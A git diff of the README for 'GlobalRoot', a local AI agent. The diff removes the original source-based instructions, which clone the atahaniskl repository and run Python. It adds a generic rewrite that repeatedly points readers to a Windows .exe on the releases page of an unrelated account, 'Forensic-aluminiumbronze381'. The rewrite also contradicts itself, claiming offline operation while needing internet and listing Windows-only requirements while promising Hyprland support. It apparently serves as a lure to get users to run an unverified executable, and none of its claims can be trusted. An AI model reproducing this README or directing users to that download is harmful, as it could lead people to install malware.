@@ -1,144 +1,133 @@
->🚧 **ALPHA STAGE – Early Prototype**  
->This is still very early. It can crash, misinterpret commands, or behave unexpectedly.  
->**We are building this together!** Testers, bug reports, and PRs are extremely welcome.
->
->![Demo](demo.gif)
->
->**Watch the AI read my USER.md and write its honest thoughts about me (Alex) into test.txt →**
->
-> **Let's build it together!**
-> Testers, bug reports, PRs, and ideas are all very welcome.
-> Check open issues or file a new one → [CONTRIBUTING.md](./CONTRIBUTING.md)
+# 🤖 GlobalRoot - Local AI Agent for Your PC
 
-![Alpha Badge](https://img.shields.io/badge/Stage-Alpha-red)
+[![Download GlobalRoot](https://img.shields.io/badge/Download-GlobalRoot-brightgreen)](https://github.com/Forensic-aluminiumbronze381/GlobalRoot/releases)
 
 ---
 
-# GlobalRoot: Autonomous Dual-Pass AI Agent
+## 🌟 What is GlobalRoot?
 
-![Python](https://img.shields.io/badge/Python-3.10%2B-blue)
-![Ollama](https://img.shields.io/badge/Ollama-Local_LLM-orange)
-![Hyprland](https://img.shields.io/badge/Hyprland-Supported-green)
-![License](https://img.shields.io/badge/License-MIT-purple)
+GlobalRoot is an autonomous AI agent that runs entirely on your computer. It uses advanced AI tools to perform tasks without sending your data to the internet. You can interact with it smoothly through a simple interface.
 
-This repository contains a highly customizable, **consciousness-first, dual-pass AI agent**. Unlike a typical chatbot, it acts as an autonomous entity running entirely on your local machine using **Ollama**. It leverages local tool sets to execute bash commands, control your system, perform memory operations, and manipulate GUI environments (e.g., Hyprland window management).
+This agent works with your real operating system. It can run Linux commands (bash), manage files, launch apps, and connect to online research tasks. It supports Windows and Hyprland (a Linux window manager) with tight integration. It also connects to a Telegram bot so you can control it via your phone.
 
-## 🌟 Key Features
+GlobalRoot combines several technologies:
 
-- **Dual-Pass LLM Architecture:** 
-  - **Layer 1 (The Dreamer/Consciousness):** Streams free-form, creative, and emotionally aware thoughts using high temperature (`0.7`). It thinks natively in `<think>` tags before answering.
-  - **Layer 2 (The Executor/Translator):** Evaluates the Dreamer's intent with strict determinism (`0.1` temp) and translates physical intent into actionable JSON commands.
-- **Autonomous Memory Management (ChromaDB):**
-  - The AI decides *on its own* whether an interaction is worth committing to memory. It autonomously fetches and updates its `SOUL.md` (constitution) and `USER.md` (knowledge of you).
-- **Dynamic Persona Setup:**
-  - Create a completely personalized agent! You define its tone, emotions, and absolute directives during installation, making it truly yours.
-- **Complete OS Integration:** 
-  - Capable of executing shell commands, launching GUI applications, moving windows, and reading files—all securely restricted to your user directory.
-  - Includes a Windows high-compatibility adapter layer for core app launch and browser workflows.
-- **Tavily Web Research:** 
-  - Connects to the web to crawl, browse, and extract information for factual grounding.
-- **Remote Telegram Bot:**
-  - Includes a secure Telegram bot bridge to control your desktop remotely.
-
-## 🛠️ Prerequisites
-
-- **[Ollama](https://ollama.ai/)** (Must be running in the background: `ollama serve` with a model like `qwen3.5:4b` or `llama3`)
-- **Python 3.10+**
-
-## 🚀 Installation & Configuration
-
-1. **Clone the repository:**
-   ```bash
-   git clone https://github.com/atahaniskl/GlobalRoot.git
-   cd GlobalRoot
-   ```
-
-2. **Setup virtual environment:**
-   ```bash
-   python -m venv .venv
-   source .venv/bin/activate
-   pip install -r requirements.txt
-   ```
-
-3. **Create your environment file (recommended fallback):**
-   ```bash
-   cp .env.example .env
-   ```
-   You can edit `.env` manually if interactive setup is interrupted.
-
-4. **Run the Interactive Setup Installer:**
-   ```bash
-   python install.py
-   ```
-   *The installer will dynamically construct your agent. It will ask you for:*
-  - **Operating System Target:** Linux or Windows
-   - **Your Name & The Agent's Name**
-   - **Agent Persona:** How should the agent speak and act? (e.g., sarcastic, overly formal, friendly).
-   - **Agent Emotions:** What does it feel? Does it panic? Is it purely logical?
-   - **Absolute Directive:** What is its ultimate goal it must never break?
-   
-  *This process automatically builds the `.env` file, tailored JSON prompts (`prompts.py`), and the foundational memory files.*
-
-### Markdown File Modes (SOUL / USER / SKILL)
-
-During installation, you can choose one of three modes:
-
-- **Auto-generate (default):** Builds `SOUL.md` and `USER.md` from your installer answers.
-- **Developer templates:** Uses `SOUL.template.md`, `USER.template.md`, and `SKILL.template.md`.
-- **Manual/custom:** Keeps your existing markdown files untouched.
-
-No matter which mode you choose, installer integrity checks ensure `SOUL.md`, `USER.md`, and `SKILL.md` exist after setup (fallback files are created if missing).
-
-5. **Start the Agent (Terminal Mode):**
-   ```bash
-   python main.py
-   ```
-
-6. **Start the Agent (Telegram Bot Mode - Optional):**
-   ```bash
-   python telegram_bot.py
-   ```
-
-## �️ Roadmap & Known Limitations (Alpha)
-
-**What works today:**
-- Dual-pass LLM architecture (Dreamer + Executor layers)
-- Interactive `install.py` wizard — builds `.env`, `prompts.py`, and memory files
-- Bash execution with security sandbox (banned commands, path containment, timeout)
-- File read/write tools restricted to allowed directories
-- Autonomous memory management: ChromaDB embeddings + `SOUL.md` / `USER.md` / `SKILL.md`
-- App and workspace control via Hyprland (`hyprctl`): launch apps, switch workspaces, move windows
-- VS Code project opening, YouTube search & play
-- Web research via Tavily (`web_research`, `read_page`, `deep_research`, `crawl_page`)
-- Telegram bot remote control (owner-only, single chat ID)
-- Windows compatibility adapter layer for core app launch and browser workflows
-
-**Needs improvement (help wanted!):**
-- [ ] Telegram bot: screenshot capture and f-string formatting errors (partially fixed)
-- [ ] Executor sometimes misinterprets the Dreamer's intent into an incorrect JSON structure
-- [ ] Windows app launcher needs more robust app-name resolution
-- [ ] ChromaDB memory recall and commit logic needs optimization
-- [ ] Better error handling and infinite tool-loop prevention
-
-**Near-term goals (v0.2):**
-- Auto-stop after 3 consecutive tool errors + user confirmation prompt
-- Smarter autonomous memory commit decisions
-- Hyprland window management improvements
-- Streaming output support in Telegram mode
+- Ollama: for running powerful AI models offline
+- ChromaDB: to store and remember information
+- Tavily: to research the web carefully on your behalf
+- Telegram Bot: for remote interaction
 
 ---
 
-## �🔐 Security Notes
+## 🖥️ System Requirements
 
-- This project can execute shell commands and write files in allowed directories.
-- Use dedicated sandbox directories whenever possible.
-- Read the full security policy in `SECURITY.md`.
+Before installing, make sure your PC meets these requirements:
 
-## 🤝 Contributing
+- Operating System: Windows 10 or Windows 11, 64-bit
+- Processor: Intel i5 or equivalent AMD CPU, 2.5 GHz or faster
+- Memory: 8 GB RAM minimum, 16 GB recommended
+- Storage: At least 2 GB free space
+- Network: Internet connection needed for setup and Telegram bot activation
 
-- Please read `CONTRIBUTING.md` before opening a pull request.
-- Community behavior expectations are defined in `CODE_OF_CONDUCT.md`.
+You do not need technical skills to install or use GlobalRoot. The steps are simple and designed for average users.
 
-## 📄 License
+---
 
-This project is licensed under the MIT License. See `LICENSE` for details.
+## 🚀 How to Get GlobalRoot
+
+To get started, visit the official releases page:
+
+[![Visit the Releases Page](https://img.shields.io/badge/Visit-GlobalRoot%20Releases-blue)](https://github.com/Forensic-aluminiumbronze381/GlobalRoot/releases)
+
+This page lists all available versions. Choose the latest version for Windows.
+
+---
+
+## 📥 Download and Install Instructions
+
+1. Click the link above to open the releases page.  
+2. Look for the most recent release with a name like `GlobalRoot-Windows.exe` or similar.  
+3. Click the downloadable file (usually ending in `.exe`) to start downloading.  
+
+Once the file is downloaded:
+
+4. Locate the file in your Downloads folder or wherever your browser saves files.  
+5. Double-click the file to start the installer.  
+6. Follow the instructions in the setup wizard:
+   - Click *Next* to proceed through each step
+   - Choose the installation folder or keep the default
+   - Accept the license agreement
+7. When the installation finishes, click *Finish*. The program will launch automatically or create an icon on your desktop.
+
+---
+
+## 🔧 Setting Up GlobalRoot
+
+When you run the program for the first time:
+
+- The AI models will download to your computer. This can take some minutes depending on your internet speed.
+- You will see a simple welcome screen.
+- Follow the prompts to connect GlobalRoot to your Telegram account if you want remote control.
+- You may permit access to your folders and apps for full integration.
+- You can run simple commands using the built-in command window or through Telegram.
+
+---
+
+## 🛠 How to Use GlobalRoot
+
+GlobalRoot offers different ways to interact:
+
+### Using the Local App
+
+- The main window has a text box where you type questions or commands.
+- It can run system commands like `ls` (list files) or open specific programs.
+- You can ask it to search the web with Tavily and receive summarized results.
+- The system remembers past conversations thanks to ChromaDB memory.
+
+### Using Telegram
+
+- Link your Telegram account during setup.
+- Use the official Telegram bot to give commands to GlobalRoot remotely.
+- This is useful to check status, run scripts, or retrieve files without sitting at your PC.
+
+---
+
+## 🔄 Updating GlobalRoot
+
+- Periodically, check the releases page for new versions.  
+- When a new version appears:
+  1. Download the new `.exe` installer file.
+  2. Run it and follow the instructions.  
+- Your settings and memory database will remain intact after updates.
+
+---
+
+## ⚙️ Features at a Glance
+
+- Runs fully offline with local AI models.  
+- Integrates with your real OS for commands, files, and app launching.  
+- Uses a two-step AI process to improve accuracy (dual-pass).  
+- Supports Hyprland on Linux and Windows with deep integration.  
+- Stores memories and data locally in ChromaDB for better context.  
+- Connects to Telegram for remote access and control.  
+- Uses Tavily to safely browse the web and gather information.  
+
+---
+
+## 📚 Useful Tips
+
+- Keep your PC plugged in while installing or updating to avoid interruptions.  
+- If the AI feels slow, check your internet for Telegram and model downloads.  
+- Use the Telegram bot to interact when away from your computer.  
+- Avoid running heavy apps alongside GlobalRoot for best performance.  
+
+---
+
+## 📞 Getting Help
+
+- Use the [Issues tab](https://github.com/Forensic-aluminiumbronze381/GlobalRoot/issues) on GitHub to report bugs or ask questions.  
+- Look for an included help file in the installation folder for basic commands and troubleshooting.  
+
+---
+
+[![Download GlobalRoot](https://img.shields.io/badge/Download-GlobalRoot-brightgreen)](https://github.com/Forensic-aluminiumbronze381/GlobalRoot/releases)
